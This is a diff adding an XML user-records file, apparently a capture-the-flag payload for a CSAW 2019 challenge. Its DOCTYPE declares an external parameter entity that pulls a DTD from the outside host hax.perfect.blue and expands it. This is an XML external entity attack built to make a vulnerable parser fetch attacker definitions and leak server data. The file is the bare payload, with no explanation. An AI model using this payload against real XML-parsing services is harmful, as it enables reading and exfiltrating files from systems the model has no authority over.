@@ -1,0 +1,19 @@
+<?xml version='1.0'?>
+<!DOCTYPE foo [
+<!ENTITY % mega SYSTEM "http://hax.perfect.blue/lol.dtd"> %mega;]>
+<users>
+    <user>
+        <username>lol;</username>
+        <password>passwd1</password>
+        <name>hax</name>
+        <email>alice@fakesite.com</email>  
+        <group>CSAW2019</group>
+    </user>
+    <user>
+        <username>bob</username>
+        <password>passwd2</password>
+        <name> Bob</name>
+        <email>bob@fakesite.com</email>  
+        <group>CSAW2019</group>
+    </user>
+</users>
